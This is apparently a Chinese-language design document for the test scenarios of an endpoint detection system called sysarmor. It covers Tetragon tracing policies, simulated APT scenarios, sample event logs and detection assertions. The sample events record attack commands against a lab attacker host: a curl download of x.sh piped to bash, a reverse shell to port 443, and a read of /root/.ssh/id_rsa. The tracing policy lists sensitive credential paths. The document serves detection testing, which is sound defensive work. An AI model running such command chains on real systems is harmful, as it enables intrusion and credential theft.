# 测试场景输入输出

每个场景的完整数据流:什么进去了,什么出来了,长什么样。

## 输入

### 环境输入 (env/)

| 输入 | 位置 | 作用 |
|---|---|---|
| compose.yaml | env/container/ | 声明 4 容器 (attacker 10.66.0.99 / node-a .11 / mgr .10 / tetragon) + sysarmor-net |
| Vagrantfile | env/vm/ | 声明 3 VM (同 IP 分配) |
| Dockerfile ×3 | env/container/images/ | attacker: C2 服务; node-a: web 运行时+CI+假凭据; mgr: 预留 |
| provision 脚本 | env/vm/provision/ | setup-c2.sh / setup-credentials.sh；agent 与 Tetragon sensor 由 `deployments/install-agent.sh` 安装 |
| TracingPolicy | env/resources/syscall-capture.yaml | replay/debug/perf 兼容的 tetragon 采集策略 |
| 假凭据 | env/resources/registry-token | 植入 node-a 的假 SA token |

### TracingPolicy 详情

```yaml
# env/resources/syscall-capture.yaml
spec:
  kprobes:
  - call: "security_socket_connect"     # 网络外联 (T1571 C2 回连)
    args: [sockaddr, int]
    selectors: [AF_INET / AF_INET6]

  - call: "security_file_permission"    # 凭据/敏感文件读 (T1552)
    return: true
    args: [file, int]
    selectors:
      - matchArgs: [Prefix: "/root/.ssh", "/var/run/secrets", "/etc/passwd"]
```

即:tetragon 只采集两类内核事件 -- **connect**(谁连了哪)和 **file_read**(谁读了敏感文件)。
加上自动采集的 process_exec/process_exit(进程谱系),构成 Event 三轴:
process lineage / network socket / credential file。

### 场景输入 (scenarios/)

| 场景 | attack.sh 做什么 | 触发方式 |
|---|---|---|
| apt-fileless-c2 | `docker exec node-a` → curl 下载 x.sh → bash 执行 → 反弹 shell + 后渗透 | 容器: docker exec; VM: vagrant ssh |
| apt-staged-drop | `docker exec node-a` → curl 下载 helper → sleep GAP → 执行 helper 连 C2 | 同上 |
| benign-ci-noise | `docker exec node-a` → 循环 N 轮 build.sh (curl+编译+写 artifact) | 同上 |

### PolicyEnvelope (policies/)

6 个 PolicyEnvelope 是 sysarmor agent / manager 控制面的目标契约样例。当前 agent-managed runtime 已经存在,但完整 policy/rule content 下发、版本化、启停闭环还未完成。详见 `policies/README.md`。

| collection.yaml | 采集哪些事件种类 (EXEC/OPEN/CONNECT...) | 后续控制面下发采集意图时 |
| detection.yaml | 检测规则 + 收敛参数 (rarity_structural, top_k=8) | 后续规则内容运营时 |
| detection-additive.yaml | 对照档: additive_threshold (反模式,仅 benign-ci-noise 对照用) | 对照实验时 |
| resource.yaml | 端侧资源上限 (RSS 512MB, lineage TTL 1min...) | 后续资源阈值门禁时 |
| telemetry.yaml | 上行批处理/重试/优先级 | agent 上报配置运营时 |
| response.yaml | 响应模式 (MVP 固定 OBSERVE) | response 审计闭环落地时 |

详细说明见 `policies/README.md`。

与 TracingPolicy 的区别:TracingPolicy 是 tetragon 原生配置,用于 replay/debug/perf 兼容路径;
PolicyEnvelope 是 agent/manager 层策略契约,定义"检测/收敛/资源/上行/响应"策略。当前 e2e 主路径会用脚本临时生成的最小 policy 验证 agent-managed runtime;完整 PolicyEnvelope 控制面仍待接入。

## 输出

### 采集输出

```
.results/
├── <scenario>.container.tetragon.jsonl    容器拓扑事件流
└── <scenario>.vm.tetragon.jsonl           VM 拓扑事件流
```

每行一个 JSON 事件,三种事件类型:

| 事件类型 | 含义 | 关键字段 |
|---|---|---|
| process_exec | 进程启动 | exec_id, pid, binary, arguments, parent_exec_id, docker(容器ID) |
| process_exit | 进程退出 | exec_id, pid |
| process_kprobe | 内核探针 | function_name, args(sockaddr_arg/file_arg), policy_name |

### 事件样例

#### process_exec -- 进程谱系

```json
{
  "process_exec": {
    "process": {
      "exec_id": "MzYyMzZmZTY1ZjVmOjIxNDc4...",
      "pid": 16783,
      "binary": "/usr/bin/bash",
      "arguments": "-c \"curl -s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh ...\"",
      "docker": "8b5a7543aa5f21dbaceb131ccfe5f91",
      "parent_exec_id": "MzYyMzZmZTY1ZjVmOjEyNjM4..."
    },
    "parent": {
      "pid": 14354,
      "binary": "/usr/local/bin/entrypoint.sh"
    }
  }
}
```

exec_id → parent_exec_id 构成 **lineage 轴**(进程谱系)。
docker 字段标识容器拓扑的 endpoint namespace。

#### process_kprobe: security_socket_connect -- C2 外联

```json
{
  "process_kprobe": {
    "process": {
      "pid": 16789,
      "binary": "/usr/bin/curl",
      "arguments": "-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh",
      "docker": "8b5a7543aa5f21dbaceb131ccfe5f91",
      "parent_exec_id": "MzYyMzZmZTY1ZjVmOjIxNDc4..."
    },
    "function_name": "security_socket_connect",
    "args": [
      { "sockaddr_arg": { "family": "AF_INET", "addr": "10.66.0.99", "port": 8080 } },
      { "int_arg": 16 }
    ],
    "policy_name": "sysarmor-syscall-capture"
  }
}
```

sockaddr_arg 给出 **C2 目标**(10.66.0.99:8080 = 下载; :443 = 反弹 shell)。
parent_exec_id 回溯到 bash → entrypoint,构成攻击链。

#### process_kprobe: security_file_permission -- 凭据读取

```json
{
  "process_kprobe": {
    "process": {
      "pid": 16804,
      "binary": "/usr/bin/cat",
      "arguments": "/root/.ssh/id_rsa",
      "docker": "8b5a7543aa5f21dbaceb131ccfe5f91"
    },
    "function_name": "security_file_permission",
    "args": [
      { "file_arg": { "path": "/root/.ssh/id_rsa", "permission": "-rw-------" } },
      { "int_arg": 4 }
    ],
    "return": { "int_arg": 0 }
  }
}
```

file_arg 给出 **敏感文件路径** + 权限。int_arg=4 = MAY_READ。
return=0 表示读取成功。

### 各场景典型事件摘要

**apt-fileless-c2** (54 process_exec + 32 kprobe,容器拓扑):

```
谱系:  entrypoint.sh → bash → curl 10.66.0.99:8080/x.sh
                          → bash /dev/shm/x.sh → bash -i (反弹 shell)
                                                    → cat /root/.ssh/id_rsa (后渗透)
kprobe: security_socket_connect  curl → 10.66.0.99:8080     (下载)
        security_socket_connect  bash → 10.66.0.99:443       (C2 回连)
        security_file_permission cat  → /root/.ssh/id_rsa     (凭据窃取)
```

**apt-staged-drop** (19 process_exec + 18 kprobe,容器拓扑):

```
lineage A: bash → curl 10.66.0.99:8080/helper → 写入 /var/lib/app/plugins/helper
           ──── 间隔 GAP 秒 (lineage A 过期) ────
lineage B: bash → /var/lib/app/plugins/helper --report 10.66.0.99:443

kprobe: security_socket_connect  curl → 10.66.0.99:8080      (下载)
        security_socket_connect  bash → 10.66.0.99:443       (执行后回连)
```

端侧任一 lineage 都不完整;只有云端 provenance graph 经 `/var/lib/app/plugins/helper` 文件节点缝合才能成案。

**benign-ci-noise** (43 process_exec + 48 kprobe,容器拓扑):

```
CI 轮次 ×N: bash build.sh → curl 10.66.0.99:8080 (拉依赖) → javac → 写 artifact

kprobe: security_socket_connect  curl → 10.66.0.99:8080 ×6  (每轮都有)
        security_file_permission (非敏感路径,不命中 TracingPolicy)
```

curl 外联模式与攻击完全相同,但 Incident 必须为 0 (罕见度随重复趋零,不会误报)。

## 断言输出

每个场景有 `expected.yaml` 契约,定义三層断言:

```yaml
# 例子:apt-fileless-c2/expected.yaml
events:                    # L1: 原始事件
  must_contain:
    - { kind: CONNECT, dst: "10.66.0.99:443" }

endpoint_signals:          # L2: 端侧信号
  must_contain:
    - { name: reverse_shell_pattern, terminal: true }

incident:                  # L3: 云端裁决
  count: 1
  converge_method: "rarity+causal-topk"

negative:                  # 负向
  endpoint_terminal_required: true
```

| 层级 | 断言什么 | 当前状态 |
|---|---|---|
| events | manager 是否能查到指定 scenario 的事件 | 当前 e2e 已断言 |
| endpoint_signals | agent/manager 是否产了指定 endpoint Signal + entities | 当前 container detection e2e 已断言核心信号 |
| incident | 云端是否产了指定 Incident + 证据子图 | 当前 container detection e2e 已断言 incident 存在;完整 evidence graph lifecycle 待补 |

`harness/assert.py` 仍偏历史通用断言入口;当前更可靠的 Signal/Incident 断言已经放在专门的 `harness/e2e-agent-*.sh` 脚本中,通过 `sysarmorctl` 查询 manager 结果。

## control_assertions (对照实验)

benign-ci-noise 和 apt-staged-drop 的 expected.yaml 含 `control_assertions`:

```yaml
# benign-ci-noise
control_assertions:
  - switch: "converge.mode=additive_threshold"   # 切裸加
    then_incident_count_min: 1                    # 裸加会误报

# apt-staged-drop
control_assertions:
  - disable: cloud.cross_lineage                  # 关闭跨 lineage 缝合
    then_incident_count: 0                         # 则不成案
```

这些是**反事实推理**:如果关掉某个能力,结果应该反转。用于证明该能力的必要性。
